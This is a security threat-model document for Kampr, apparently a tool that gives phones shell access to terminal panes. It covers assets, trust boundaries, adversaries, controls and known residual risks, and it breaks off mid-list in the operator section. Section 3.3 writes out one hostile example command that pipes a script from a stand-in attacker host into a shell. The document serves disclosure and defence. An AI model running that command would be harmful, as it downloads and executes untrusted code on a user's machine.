# Threat model

**Kampr grants unrestricted code execution on every host it can reach.** It types into live
terminals as you, with your environment, with no command filtering. Anything that gets past its
authentication has a shell on your machine, and on every machine you have meshed to it.

That is the product, not a defect. It is also the only sentence in this document that matters if you
read no further: **do not expose Kampr to a network you do not control, and do not treat any rung of
the setup ladder as a substitute for the phone's own lock screen.**

This document is written to be checkable rather than reassuring. Where a control is weaker than it
looks, it says so. Where a risk is known and unfixed, it is listed under
[§7 Residual risks](#7-residual-risks-known-and-real) rather than omitted. The live defect list is
[`06-audit.md`](./06-audit.md); this file is the standing analysis, and the two are meant to be read
together.

Status: **released and unreviewed**. The security pass in `413083a` closed nine audited defects, each
with a test that failed first. It was not an external review, and one has not happened. Kampr is
published — see the releases — so the reachable surface is now whatever an operator has pointed at
the internet rather than whatever was on one desk.

---

## 1. Assets

In rough order of what an attacker actually wants:

| Asset | Where it lives | Why it matters |
| --- | --- | --- |
| **Command execution on the host** | Herdr's socket, reached through the node | The whole prize. Everything else is a route to this |
| **Everything on every terminal** | pane frames, scrollback, transcripts | Source code, credentials pasted into shells, API keys in agent output, `git` remotes, `ssh` sessions |
| **Agent transcripts** | `~/.claude/projects/**`, `~/.codex/sessions/**` | Whole-session history, often more complete than the terminal |
| **Device tokens** | SQLite (`kampr.db`, 0600) as SHA-256 digests; cleartext on the enrolled device | A token *is* the credential. There is no second factor at the bottom rung |
| **Passkey credentials** | SQLite, scoped to an RP ID | Not extractable; the risk is enrolment, not theft |
| **Pairing / mesh join codes** | SQLite as argon2id digests; **cleartext on a screen while in use** | A short-lived path to a full-role device |
| **The node's identity key** | `node.key`, 0600, in a 0700 config dir | It *is* the node's mesh credential; holding it is being that node |
| **The VAPID private key** | beside the database, 0600 in a 0700 dir | Signing pushes as this node to its subscribers |
| **The audit log** | `audit.jsonl`, 0600 | Reads back what was answered, what was run, and what was refused; also the only forensic record |
| **The CLI's own device token** | `client.toml`, 0600 in a 0700 config dir | A full-role token in the clear on the host, the same way an enrolled browser holds one |

---

## 2. Trust boundaries

```
   ┌─ the person holding the phone ─────────────────────────────────────────┐
   │   device token or passkey in a browser / app                           │
   └──────────────────┬─────────────────────────────────────────────────────┘
                      │  ①  network → node          TLS is the operator's job
   ┌──────────────────▼─────────────────────────────────────────────────────┐
   │  kampr node    binds loopback by default; --bind is an explicit act    │
   │    ②  token → device → role                                            │
   │    ③  role → operation      readonly is refused input/answer/manage    │
   └──────────────────┬─────────────────────────────────────────────────────┘
                      │  ④  node → herdr            NO BOUNDARY AT ALL
   ┌──────────────────▼─────────────────────────────────────────────────────┐
   │  herdr socket    filesystem-permission-scoped to your uid, and that    │
   │                  is the entire security model Herdr has                │
   └────────────────────────────────────────────────────────────────────────┘
```

A fifth boundary appears the moment a node joins a mesh: **hub → peer**, authenticated by ed25519
node keys that are entirely separate from user credentials. It is covered in
[§3.6](#36-a-compromised-hub-or-a-node-impersonating-a-peer), and the short version is that a
compromised hub owns every peer.

Boundary ④ is the one to understand. **Herdr has no authentication.** Its socket is a filesystem
object owned by your uid, and anything that can open it can drive every pane. The node is on the
inside of that boundary and does not re-create it — a full-role Kampr device is, for every practical
purpose, a shell.

Boundary ① is not Kampr's. The node speaks plain HTTP unless you configure its own TLS or put a
proxy in front of it. At the bottom rung of the ladder there is no ① at all.

**A boundary Kampr changes on the host itself:** Herdr's socket is uid-scoped, so a process running
as a *different* user — an agent you deliberately confined under `sudo -u agent-review` — cannot open
it. A TCP port is not uid-scoped; every uid on the host shares the network namespace. So installing
Kampr puts a door into your herd that a confined uid can knock on. Unlike a header-authenticated
bridge, **knocking is not enough**: it needs a device token, and tokens live in a 0600 database
inside a 0700 directory. That is a real improvement over trusting "local means trusted", and it is
not the same as the uid boundary being intact. If that boundary is the containment you rely on, the
port must not be shared — its own network namespace, or a uid owner-match firewall rule
(`nftables meta skuid`). A plain port firewall rule does not stop a same-host peer.

---

## 3. Adversaries

### 3.1 Someone on the LAN

Reaches the node only if you opted into `--bind`. Sees plain HTTP at the bottom rung, so on an
untrusted network they see **every frame of every pane in cleartext** and can replay a token lifted
from the wire.

Defended by: needing a token at all; a 39.6-bit pairing code behind argon2id, a 10-minute TTL,
single use, a global 10-attempt burn and a per-peer rate limiter (burst 5, one per 20 s); an origin
allowlist derived from the bind address rather than from the request.

**Not defended:** confidentiality or integrity of the connection itself. That is what the middle rung
of the ladder buys, and it is why the unencrypted banner is persistent rather than dismissible.

### 3.2 Someone holding your unlocked phone

Gets everything the device has, immediately. There is **no PIN, no idle lock, no re-authentication**,
and a passkey enrolled on the device does not help — the browser session is already authenticated.

Defended by: nothing in Kampr. The boundary is the phone's own lock screen and your ability to
revoke the device from another one, which takes effect on the open socket within two seconds.

This is a deliberate omission rather than an oversight, and it should be revisited if Kampr grows a
real session of its own. Adding a client-side lock that a page reload dismisses would be worse than
having none, because it invites someone to skip a control that actually works.

### 3.3 A malicious agent, or attacker-controlled content in a pane

The most interesting adversary, because it needs no access at all. An agent fetches a web page, reads
a file, or runs a tool whose output an attacker wrote. That content lands in a pane, and the pane is
rendered on your phone.

Defended by:

- **Pane output is never HTML.** It is a cell grid drawn to a canvas. There is no innerHTML path and
  no markup interpretation anywhere in the terminal surface.
- **A strict CSP with no external origins.** `default-src 'self'`, `connect-src 'self'`,
  `frame-ancestors 'none'`, `base-uri 'none'`, `object-src 'none'`, `form-action 'none'`. Scripts
  get `'wasm-unsafe-eval'` — required by Skiko and strictly weaker than `'unsafe-eval'`. Styles are a
  **single hash** covering the one `<style>` element Compose injects into its shadow root; the node
  used to carry `'unsafe-inline'`, which permitted it, and a hash is the better trade at the most
  attacker-influenced surface in the product. Note the two cannot be combined — a browser ignores
  `'unsafe-inline'` once any hash is present.
- **Link detection is conservative, and nothing auto-navigates.** An OSC 8 hyperlink is a
  harness-*declared* URI and is treated as such; a bare URL found in cell text is *detected*, which
  is not the same thing. Detection is a strict scheme match rather than "anything with a dot in it",
  it runs over logical (soft-wrap-joined) lines so a URL wrapped at the grid edge is not missed, and a
  hit is shown on a labelled strip with an explicit Open. **Nothing in the product navigates on
  touch.** This is why link handling looks over-cautious: it is over-cautious on purpose.
- **The conversation view passes markdown through to the client renderer** rather than to a DOM.

**Not defended:** an agent that decides to run `curl attacker.example | sh` has already succeeded
without involving Kampr at all. Kampr's surface here is the rendering of what an agent produces, not
the agent's own judgement.

**Also not defended:** a pane can display anything, including a convincing imitation of Kampr's own
UI, a fake pairing code, or a fake permission prompt. The chrome is drawn outside the pane surface,
which helps, and there is no confirmation dialog that a pane could spoof into — but a user who trusts
what a terminal says is trusting the terminal.

### 3.4 A hostile web page in another tab

Tries to drive the node from a page on another origin, using the browser's ambient credentials.

Defended by:

- **A same-origin gate on `/ws` and on every non-GET request.** The allowlist is built from the
  configured origin and the bind address, never from the request's own `Host` — reflecting `Host`
  makes `Origin == Host` true for a DNS-rebinding attacker, which is the whole trick.
- **No credential this node accepts is ambient.** A token travels as a WebSocket subprotocol
  (`kampr.token.<token>`) or an `Authorization` header, and a cross-origin page can set neither
  without a preflight the node will fail. The node once also accepted a `kampr_session` cookie as a
  fallback for a cookie-based client that was never built; that path is **gone**, because a cookie is
  the one credential a browser attaches by itself and keeping it left every un-gated `GET` one
  deployment decision away from being a CSRF read.

**Weaker than it looks:** the gate exempts `GET`/`HEAD`/`OPTIONS` on every path except `/ws`, so
`GET /api/devices` — the whole device inventory — has no origin check of its own. That is only safe
because of the bullet above: a cross-origin page cannot attach a credential, so the request it can
issue is an unauthenticated one. **Reintroducing any ambient credential would have to gate those
`GET`s at the same time.** `POST /auth/webauthn/authenticate/start` is likewise unauthenticated and
un-gated; it is bounded by a 128-entry challenge cap and the auth limiter.

### 3.5 Another uid on the same host

Covered under [§2](#2-trust-boundaries). It can reach the TCP port, cannot open Herdr's socket, and
needs a token it should not have. State and config directories are 0700; the database, both SQLite
sidecars, the audit log and its rotated generation, the node identity key and the CLI's own
`client.toml` are all 0600 — the WAL explicitly, because it holds pairing digests long before they
are checkpointed into the main file.

**Not chmod'ed:** `config.toml`, which relies on its 0700 parent. It holds no secrets today (node id,
bind, origin, `trust_proxy`, paths to TLS material) and it would be better with an explicit mode.

### 3.6 A compromised hub, or a node impersonating a peer

Once a mesh link exists, **the hub is a client of every peer** — it sends `watch`, `input` and
`manage` over the ordinary v1 protocol, backwards. So a compromised hub has a shell on every peer,
and there is no per-peer scoping that would stop it. This is the centralisation the shape buys the
NAT traversal with, and it is chosen knowingly.

Defended by: node identity being an ed25519 keypair generated on first run, with the **public key as
the credential and the primary key** — a node that regenerates its identity is a different node and
must be enrolled again. Authentication is mutual and transcript-bound, so the peer refuses an
impostor answering at the hub's URL just as the hub refuses an impostor dialling in. Joining uses a
single-use, time-boxed, argon2id-digested invite with the same attempt-burning rule as a device
pairing code, and the key is pinned at first connection while the operator is looking at the
fingerprint.

**Mesh auth is a separate credential system from user auth**, so a compromised viewer session cannot
impersonate a node and a revoked device has no bearing on a link. That separation is the single most
important property here.

**One enrolled peer may not impersonate another.** A herd on a shared hub is several machines that
trust the hub and not each other, so the boundary that matters most here is the one between two
peers. The handshake authenticates a *key*; the node id it dials in with is its own word about
itself, as is everything it says afterwards, and its `herd` message can name any node it likes.
Four checks hold the boundary, and all four are on the hub:

- **A node id belongs to the key that enrolled with it.** The enrolment row records what the
  connection that spent the join code claimed; an ordinary reconnect writes nothing back to it, and
  a `hello` whose `node_id` differs from that row — or collides with another enrolled node, or with
  the hub's own — is refused `wrong_node` and audited as `mesh.refused`, so the attempt is on the
  record rather than in a log line. This is the check the other three cannot substitute for,
  because the one moment worth taking an id is while the machine that owns it is **down**: nothing
  live holds it then, and a hub that believed the latest claim would hand the id over and refuse the
  owner every reconnect afterwards, behind a `warn!` nobody reads.
- A link whose authenticated node id is already held by a live link is **refused and closed**, so
  an enrolled machine cannot dial in as its neighbour and race for the traffic.
- An advertised node or pane whose id belongs to a *different* live link, or to the hub's own
  machine, is **dropped** as it arrives, and a link that authenticates as an id takes it back from
  anything that had merely claimed it. Connection order therefore decides nothing. The hub's own id
  is part of this check because nothing else covers it: the live links hold every id but that one,
  so a peer advertising it used to be merged in beside the real entry, where a client keyed on node
  id keeps whichever arrived last — the operator's own machine renamed, marked offline, or given
  panes it does not have, by a peer.
- A pane is routed by the **authenticated** node id first, and only then by what a peer advertised.

Without them, an enrolled-but-hostile machine could advertise a victim's node id and be handed that
victim's `watch`, `input` and `manage` traffic — one host reading and typing into another's
terminals, through the hub that exists to join them.

**A name is not a credential, and revocation does not treat one as one.** A peer chooses the name
it enrols under, so two rows can answer to `laptop`; `kampr mesh revoke` acts on a public key, a
fingerprint or a node id exactly, and on a *name* only while exactly one node answers to it —
otherwise it names the candidates and cuts nothing off. Revoking the wrong machine and reporting
success is the failure that shape avoids.

A revoked peer also loses the link it already holds: the hub re-reads the enrolment row on every
keepalive tick, because `kampr mesh revoke` runs in a different process and only writes SQLite.

**Not defended, and worth stating:** first-connection key pinning is trust-on-first-use. If the join
code is intercepted *and* the attacker answers at the URL before the operator's node does, the
fingerprint the operator is shown is the attacker's. Compare it out of band if the join crosses a
network you do not control.

**`--fingerprint` does not protect the join code.** It protects the *signature*: the pin is checked
against the hub's challenge before this node signs anything, so a stranger answering at the hub's
address collects no signature and the join fails loudly. But the code travels in `mesh.hello`, the
first message on the socket, before any challenge can arrive — so by the time the fingerprint is
compared, an impostor at that address is already holding a live single-use code. The message order
is deliberate (it is what makes the peer's pin check precede its own signature) and is not changing;
what covers the code is TLS. Join over `wss://`, and treat a `wrong_hub` refusal as a code to
re-mint and an incident to look at, not as a typo.

Exercised on one machine, not across two hosts. `crates/kampr-node/tests/mesh.rs` drives real nodes
over a real socket into the hub's own `/mesh` endpoint — the handshake, the enrolment store on disk
and the serve loop are the shipped ones — and covers all four checks above in **both connection
orders**, both revocations (a second process writing SQLite, and a client of the hub spending a
device token), and a peer that stops answering keepalives. What no test here has is a network: NAT, real latency and loss, TLS
termination at a proxy, and clock skew between hosts remain designed-and-implemented rather than
exercised.

### 3.7 A read-only device

Its own category, because it is the adversary the arming mechanism exists for. A `readonly` device is
one you half-trust, and it **receives every server-to-client message**: every frame of every pane,
scrollback, and transcripts. It cannot type. Read-only bounds damage; it does not bound disclosure,
and it is not a sandbox.

That is what made a printed pairing code dangerous, and it is covered in
[§7.1](#71-the-pairing-arming-race).

A read-only device that reaches a hub reads every pane on **every peer**, not just the hub's own.
"Half-trusted" scales with the herd.

---

## 4. What each rung of the ladder does and does not protect against

| | Bottom rung (`http://<ip>:<port>`) | Middle (`https://<hostname>`) | Public / Tailscale |
| --- | --- | --- | --- |
| Credential | pairing code → bearer token, **30-day expiry** | **passkey** — phishing-resistant, non-expiring token | same |
| Wire confidentiality | **none** | TLS | TLS |
| Token replay from the wire | **possible** | prevented | prevented |
| Phishing a credential | possible (a code is a code) | prevented (origin-bound) | prevented |
| Push, PWA install | unavailable (not a secure context) | available | available |
| Reachability | LAN only, and only if you asked | LAN only unless you publish DNS | **internet-reachable** |
| Stolen unlocked phone | not defended | not defended | not defended |
| Malicious pane content | same defences at every rung | | |

Two things this table is saying that are easy to miss.

A passkey in the Android *app* additionally needs Digital Asset Links, which needs a hostname
reachable from the public internet by Google's own fetcher — see [`10-passkeys.md`](./10-passkeys.md).
The browser has no such requirement, and a node with no passkey at all is a supported configuration
rather than a broken one.

**HTTPS on an IP address does not move you up a rung.** It buys a secure context — so service workers
may work — and still no passkeys, because a WebAuthn RP ID must be a registrable domain and the
working group [declined](https://github.com/w3c/webauthn/issues/1358) to allow IP addresses.
`localhost` is the single exception, which is why `http://localhost:8790` is a passkey origin and
`http://127.0.0.1:8790` is not.

**The top rung is not more secure than the middle one; it is more reachable.** Publishing DNS adds no
control and removes the "an attacker must already be on my network" precondition. The passkey stops
being a nicety and becomes the only thing between the internet and a shell. Take that rung
deliberately or not at all.

---

## 5. Controls, and what each one actually buys

**Loopback by default.** `--bind` is an explicit act that prints what it means: *"reachable from
every device on this network. Anything that pairs here can type into every terminal on this host."*
This shipped wrong once — bound to `0.0.0.0` in cleartext, reversing the project's own policy and
crossing its own gate — which is the reason it now has a test named after the roadmap item.

**Device-bound tokens.** 256 bits from the system CSPRNG, stored as a bare SHA-256 digest (there is
no preimage worth searching for at that entropy, so a KDF would be theatre). Resolution joins through
the device row, so revoking a device kills every token it holds without touching a token row.

**A pairing code is a real credential and is treated as one.** Eight characters from a 31-symbol
confusable-free alphabet — 39.6 bits, which is guessable if you may guess often, so the limits are
the defence rather than decoration: argon2id at default cost (19 MiB, t=2) makes each attempt
expensive, the TTL is 10 minutes, redemption is single-use inside one transaction so two devices
racing a code cannot both win, a per-peer token bucket allows a burst of 5 then one per 20 s, and a
**global counter burns every outstanding code after 10 misses** — which survives IP rotation, unlike
the limiter.

**Revocation and demotion bite mid-session.** A session captured its device at handshake and never
looked again, so a revoked device kept writing until its socket happened to drop. It now re-reads the
device row every two seconds *and* on a broadcast *and* synchronously before every `input`, `answer`,
`manage` and `att.fetch` — the last because the file-id form of an attachment reads an arbitrary path
on the host, and the whole argument for serving one is that it is equivalent to typing, so it is
gated like typing rather than left open until the next recheck. Both mechanisms are needed: the
control an operator actually uses runs in a different process and only writes SQLite, so a broadcast
alone would not reach it. A revocation or an expiry
sends `error{revoked}` and closes.

**Roles are enforced at the verb, not at the connection.** A `readonly` device keeps its stream and is
refused `input`, `answer`, `notify` and `manage` with `not_writer`, and the same role gate refuses it
the device inventory, the pairing surface, the mesh surface and passkey registration over HTTP with a
403. **Every one of those refusals is now recorded** as a `refused` audit line naming the verb, the
pane, the device and how many times it has happened in this incident — a half-trusted device probing
what it can reach was the one thing this node did not write down. The line rate is bounded by
construction: an incident is logged on attempts 1, 2, 4, 8 … so a client retrying in a loop costs a
line per doubling rather than a line per attempt, and a quiet minute starts a fresh incident so an
occasional refusal is never the one that goes unrecorded. `prefs` is *allowed* for read-only, because
bounding the write is the right control rather than gating the role — a full device could fill a disk
just as easily. So prefs are bounded for everyone: the pane must exist, the blob is capped at 2 KiB,
and a device keeps at most 256 panes' preferences, least-recently-updated evicted first.

**The CLI mints itself a device, and that is not a bypass.** `kampr` with no subcommand opens this
machine's herd, and the credential it uses is a device it enrolled for itself: `cli@<hostname>`, full
role, listed by `kampr setup`, revoked like any other, and written to the audit log as
`device.minted` at creation. **There is no code path here that authenticates without a token.** What
the rung requires is *write* access to the node's own state database — and that is already a strictly
larger permission than the token it produces, because anything that can write `kampr.db` can insert a
device row and a token digest of its own choosing without going near this code. The database holds
token *digests* rather than tokens, so the argument is not "the tokens were readable anyway"; it is
that minting one needs exactly the access that forging one needs. The token itself is then held in
the clear in `client.toml`, 0600 inside the 0700 config directory, exactly as an enrolled browser
holds its own. **So the control that carries this is the 0700 state and config directory**
([§3.5](#35-another-uid-on-the-same-host)) and nothing in this path. It reuses one device across runs
rather than minting one per invocation, so the device list stays readable and a revocation is not
undone by the next command — a revoked one is not re-presented, it is replaced by a fresh enrolment
the operator can see, and the token carries the node's own Tier-0 term rather than never expiring —
a plaintext bearer credential on every machine that runs `kampr` is exactly the asset the 30-day term
exists to age out.

**Reviewed.** A security pass over this rung (2026-08-28) verified the claim above against the code
rather than the prose: `create_device` and `mint_token` are plain inserts into `devices` and
`tokens`, `Store::open` needs write access, and `mint_token` stores `secret::digest(token)` — so
read access yields digests and minting requires exactly the access forging requires. It also
confirmed no code path here authenticates without a token, that the device is identifiable
(`user_agent = "kampr-cli"`, named `cli@<hostname>`, listed by `kampr setup`), and that a revoked
device is replaced rather than re-presented. Two things it changed: the token had no expiry at all,
and the first draft of this section rested on a **false** premise — that state-directory *read*
access already yielded every token — which is now stated as the write-access argument it always
should have been.

**Rate limiting** is a token bucket keyed on the peer, with pairing at burst 5 / one per 20 s and
authentication at burst 20 / one per 2 s. Successful authentication forgets the bucket, or a device
that keeps working eventually locks out the only device that ever had a valid token.

**`X-Forwarded-For` reads the hop the proxy appended**, not the one the client sent. Reading the head
is what makes a rate limiter forgeable by the traffic it exists to limit. `trust_proxy` is opt-in and
never inferred.

**WebAuthn hygiene.** Challenges are 128-bit, single-use (removed on take, then re-checked for
expiry), 5-minute TTL, held in memory only, capped at 128 with oldest-first eviction, and
type-confusion between a registration and an authentication challenge is not possible. User
verification is required and counter regression is rejected by the library, which Kampr relies on
rather than re-implementing. Credentials are scoped to the RP ID **and** joined to a live device, so a
passkey registered against a hostname the node no longer answers on authenticates nobody.

**Audit log**, JSONL at 0600, rotating at 8 MiB into one previous generation. It records pairing
creation, arming, rejection, rate-limiting and redemption; authentication rejection and rate-limiting;
passkey registration and authentication; device revocation, role change and renewal; session open,
close, revoke and role change; and `watch`, `unwatch`, `input`, `answer` and `manage` — with `manage`
recording the op, cwd, env, args and every other non-null field. JSONL injection through a device name
or a pane label is genuinely impossible, because every field is serialised rather than formatted.

It deliberately does **not** record typed text — `input` stores a byte count, and the `keys` form a
key count — nor pane output, scrollback or transcript content. `manage` records `env` verbatim, so any secret passed as a pane
environment lands in the log; that is a considered trade in favour of knowing what ran, and it is
worth knowing before you pass one.

**Process spawning is bounded.** A `watch` from any role can cause an `observe` child to spawn, but
the registry keys them by pane, so N watchers of one pane share one child and the bound is "one per
live pane" rather than one per client. `caps` shells out to `herdr session list --json` behind a
10-second node-wide cache, with a spawn counter that exists purely so a test can assert *did not
spawn* rather than *returned quickly*. `session.create` — the only spawn that outlives the node — is
full-role only, and its name is validated to `[A-Za-z0-9_-]{1,64}` because it becomes a directory
name and reaches a command line.

---

## 6. Explicitly not defended

Stated plainly so nobody builds a control that pretends otherwise.

**Full command passthrough is the product.** There is no allow-list, no forbidden-command filter, no
sandbox between a device and a shell. An allow-list would defeat the purpose and would be trivially
bypassed by the shell it is protecting.

**A full-role device is equivalent to a shell.** Not "can run some commands" — a shell, with your
environment, on every host in the herd. Every control in this document exists to decide *who becomes
a device*, and none of them constrain a device afterwards.

**Kampr does not defend the herd from its own agents.** An agent you started has whatever access you
gave it.

**Kampr does not manage a front door.** It supplies its own TLS or trusts a proxy. It does not
publish, supervise or tear down a tunnel, and it never will — that is a CLI contract it could not
test.

**Kampr does not protect against you.** `manage` can close panes, kill workspaces and start agents.
A structural action states what it will do before doing it; it does not ask twice.

**A destructive-command confirmation does not exist.** It is on the roadmap and is not built. Do not
plan around it.

---

## 7. Residual risks, known and real

Each of these is understood, unfixed, and listed here rather than in a backlog.

### 7.1 The pairing-arming race

**The setup.** A pairing code is printed into a Herdr popup pane, and a read-only device watches
panes by design — so a code on a screen is a code an untrusted device has already read. The fix is
that a code minted at the console is **inert until an operator arms it from that console**: the
keypress is the out-of-band channel a watching device does not have. Arming opens a **60-second**
window.

**The residue.** That window is keyed on the code alone. Nothing binds redemption to the device the
operator intended — no nonce, no pre-registration, no peer pinning. **Whoever presents the code first
inside the window wins**, and the claim is atomic, so the loser simply loses.

**What bounds it.** The attacker cannot observe the arming event, so it must poll — and every poll
with the correct code before arming falls into the miss branch and charges an attempt against *every*
outstanding pairing. After ten, the code is dead and the operator is told to make another. The attack
converts itself into a visible denial of service. The per-peer limiter adds friction and is defeated
by rotating source addresses; the global counter is not.

**Why it is still real.** The CLI tells the operator to type the code on the device *first* and then
press Enter, so the window opens at a moment an attacker can predict — immediately before a
legitimate redemption. One well-timed poll suffices, and the reward is a **full-role** device. The
mitigation is the attempt counter, not exclusivity.

**Operator guidance:** watch the window. If arming reports *"that code is no longer valid"*, treat it
as an attempted theft rather than as a typo, and audit your device list.

**Also worth knowing:** the "nothing can be watching yet" shortcut that auto-arms the first code
checks only for active *Kampr* devices. A local user, or anyone already attached to the Herdr
session, can read that pane regardless.

### 7.2 A mid-session demotion is announced — decided and closed

Demoting a device from `full` to `readonly` takes effect within two seconds, is audited, and **is
now sent to the client** on the socket it is already holding, as
[`role`](./04-wire-protocol.md#role--this-devices-role-changed-mid-connection). A promotion travels
the same way, so a device upgraded to full gains its affordances without reconnecting.

The decision the previous revision of this section asked for was made this way: a **new message**,
not a re-sent `hello`. `hello` is defined as the first message on a connection, and quietly making
it re-sendable would have broken that contract for every future reader; a dedicated `t` is additive,
and the node ignores unknown `t` values in both directions, so an older client carries on exactly
as before. Tests: `live.rs::a_demotion_and_a_promotion_are_both_announced_on_the_open_socket`
asserts the frames on a real socket *and* that no second `hello` precedes them, and the client's
`RoleChangeTest` drives the same bytes through a real WebSocket into the real store and asserts the
write affordances leave and come back without a reconnect.

What is left is inherent rather than a gap: the frame is a courtesy to the UI, never the control.
Enforcement is at the verb and the node re-reads the device row before every write, so a client
that ignores `role` is refused all the same. Revocation and expiry are still different: both send
`error{revoked}` and close.

### 7.3 Pane output is attacker-influenceable

Covered in [§3.3](#33-a-malicious-agent-or-attacker-controlled-content-in-a-pane). Recorded here
because it is a standing property of the system rather than a bug to be closed: the terminal surface
is the most attacker-influenced thing in the product, and every change to it inherits that. The
CSP hash, the canvas rendering, the strict scheme match and the refusal to auto-navigate are all one
control, and weakening any of them weakens the set.

### 7.4 The bottom rung is cleartext, and the banner is the only thing saying so

A token on a plain-HTTP LAN is replayable by anyone on the path. The persistent banner is not
decoration and must not become dismissible. The 30-day expiry exists to force a deliberate decision
to keep operating that way.

### 7.5 `renew` extends a token in place

`POST /api/devices/{id}/renew` extends the device row and every one of that device's **live** token
rows to the same new expiry, in one transaction. In place, not a re-mint: nothing can hand a new
token to a phone the node is currently refusing, so a renew that minted would still be a re-pair.
The device that pressed Renew keeps the token it is already holding.

Three properties hold it in the fail-safe direction:

- **Revoked stays revoked.** The token update is `WHERE revoked_at IS NULL`, and a revoked *device*
  is not un-revoked by a renewal either — `revoked_at` is untouched, and `Device::active` still
  refuses it.
- **No expiry is invented.** The new expiry is `Auth::expiry`, the same value pairing mints with, so
  on a passkey tier it is `NULL` and a renewal leaves a device that never expires exactly that.
- **One transaction.** A device row extended with its token left behind is the failure this
  replaced, and it is not reachable a row at a time.

Renewal remains manual and audited (`device.renewed`, carrying the new expiry and how many token
rows it covered). There is deliberately no renew-on-activity: the 30-day Tier 0 term exists to force
a decision to keep operating in cleartext, and a term that slides whenever the device connects is
not a term.

### 7.6 An unparseable role in the database reads as read-only

The `devices.role` column is `TEXT NOT NULL` with no `CHECK` constraint, so corruption or a future
migration could write a string nothing parses. It fails **closed**: `Role` derives
`#[default] Readonly` and `device_from_row` uses `.parse().unwrap_or_default()`, so an unreadable
role is the least privilege rather than the most. The missing `CHECK` constraint is still worth
adding — a column that can hold nonsense is a column that will — but the failure direction is right.

### 7.7 The unauthenticated surface does real work

Two endpoints do memory-hard work for a caller who has proved nothing, and both run one argon2id
pass at 19 MiB per attempt:

- `POST /auth/pair`, where the per-peer limiter runs *before* the digest.
- `GET /mesh`, where an anonymous caller signs the handshake with its own freshly generated key and
  presents any string as a join code. It is guarded by three things: `mesh.accept` is **off by
  default**, so a node that never meshes does not answer at all; a per-peer limiter runs before the
  upgrade, exactly as `/auth/pair` does, and a miss is audited as `mesh.rate_limited`; and a
  semaphore caps handshakes in flight, which is what bounds the memory when an attacker rotates
  source addresses past the limiter. A handshake that stalls is hung up after fifteen seconds so it
  cannot hold a permit indefinitely. Without the limiter a stranger could also burn every
  outstanding join code, because a miss charges each one an attempt and ten kills them.

  **The residual is availability, deliberately.** Someone rotating addresses can hold every
  handshake permit and keep a genuine peer from joining for as long as they keep it up. That is the
  trade the cap buys: an attacker who can delay a join, instead of one who can exhaust the host's
  memory and take the herd down with it. It costs nothing while `mesh.accept` is off.

The SQLite pool is four connections, which is the next bound behind both. `POST
/auth/webauthn/authenticate/start` is unauthenticated, un-origin-checked, and parks ceremony state
behind a 128-entry cap. None is a large lever; all are levers.

**A hub's memory is bounded by what a peer sends, not by what it claims.** A relayed pane's shadow
allocates from the geometry in a `grid.reset`, so a ~100 byte frame claiming `65535x65535` asked for
159 GiB until the grid was clamped; and its style and hyperlink tables are appended to across
messages and never evicted from, so a peer sending small, well-formed messages often enough grew
either without limit. All three are ceilings on the hub side now, generous against every pane ever
measured here and unreachable by anything speaking the protocol honestly.

Live sockets and inbound message size are bounded too: `limits.sockets` client sessions at once,
`limits.mesh_handshakes` handshakes, 1 MiB per message and per frame on `/ws`, and 16 MiB on
`/mesh` — against tungstenite's 64 MiB/16 MiB defaults. The two differ because a mesh link is the
client protocol backwards, so a hub *reads* a peer's server frames, and a scrollback document runs
to several megabytes on a pane deep enough to fill the ring.

A cap on sessions is only a bound if sessions are also *released*, and one class of client never
released: a peer that freezes rather than closing — a phone suspended in the background, a laptop
asleep, a NAT that dropped the flow — leaves a socket whose kernel is alive and answering TCP's
window probes with a zero window, which resets the probe counter, so nothing below ever errors and
the session was served indefinitely (#284, measured still held after twenty-five minutes). It cost
a permit out of `limits.sockets` and, while it held a watch on a producing pane, as much of herdr
as a live viewer. `limits.client_keepalive_secs` is the answer: the node pings each client socket
on that interval and drops one that leaves three unanswered, and bounds the send itself by the same
deadline for the case where the write is what hangs. Unauthenticated exhaustion of `limits.sockets`
was never the risk — a socket needs a token — but a fleet of phones that come and go is the
ordinary case, not an attack.

**Connection-rate and per-IP limiting are still the reverse proxy's job.** A publicly exposed node
is expected to sit behind nginx with `limit_conn` and `limit_req`; nothing in Kampr replaces those,
and the bounds above are a floor for the case where the proxy is misconfigured, not a substitute
for one.

### 7.8 The install path grants RCE by construction

Both installers fetch a binary that will run as you and hold your herd. They verify a `SHA256SUMS`
manifest and a keyless signature over it, pinned to the release workflow's identity — with
`KAMPR_ALLOW_UNVERIFIED=1` as an explicit escape hatch for a local build. A missing bundle, a
signature that does not verify, and a host with no `cosign` to check it with are all fatal on any
base but one the operator pointed the installer at themselves: the checksums travel with the
tarball, so they establish who served it and never who built it. That is the right shape. **It has never run against a real published release**, because
no tag has been pushed, so the workflow itself — cross-compilation, signing, publication — is
unexercised. Treat the first release as unproven and check the signature by hand.

Separately, the `herdr` binary is resolved rather than named: `[herdr] binary`, then
`HERDR_BIN_PATH`, then `PATH`, then the directory kampr's own executable sits in, then the usual
install prefixes (`kampr-herdr/src/locate.rs`). That is operator-controlled and never
wire-controlled, but a poisoned `PATH` — or a writable directory beside the kampr binary — in the
service environment is a full compromise. `kampr init` and `kampr service install` record the
absolute path they resolved in `config.toml`, and a configured path with a separator in it is used
verbatim and never searched for, so a pinned node does not consult the environment at all.

### 7.9 A notification puts the agent's question on a locked screen

Kampr deliberately puts the blocked agent's actual question in the notification body, because
identifying *which* agent needs you and making you open the app to find out *what* it wants is the
known gap in the prior art. The consequence is that the question is displayed **outside every
authentication boundary in this document** — on a lock screen, in a notification shade, mirrored to
whatever else the phone syncs notifications to, and passed through a third-party push service.

Web Push payloads are end-to-end encrypted to the subscription's own keys, so the push service does
not read them; the phone's own notification handling is the exposure. An agent question routinely
quotes a command, a path or a file being edited.

There is no per-agent mute and no "identify only" mode. If any pane in the herd handles something
that must not appear on a lock screen, do not enable push for that device.

### 7.10 A herd can be silently stale

Probe #70: a herdr server was killed under a live watcher and nothing told the client — the node
reconnected on its own and re-emitted a reset, but `online` stayed `true` for the whole outage. This
is now surfaced as `herdr_unavailable`, and it is recorded here because *an interface that shows a
frozen terminal as a live one is a security-relevant lie*: it invites someone to believe a command
took effect. The same failure multiplies across a mesh link, which is why per-node health is part of
the design rather than a nicety.

---

## 8. What an operator must do

Kampr cannot do these for you.

1. **Stay on loopback until you have read this document.** `--bind` is the moment the threat model
   changes. Nothing binds off-loopback without being asked to.
2. **Get to the middle rung.** A hostname and a real certificate is the single highest-value change
   available: it turns on passkeys, ends cleartext, and costs a DNS-01 wildcard on a name that never
   leaves your LAN. Every other rung is optional.
3. **Set the canonical origin *before* enrolling a passkey.** A passkey is bound to an origin and
   does not survive a change of one. The credential rows survive and become inert; there is no
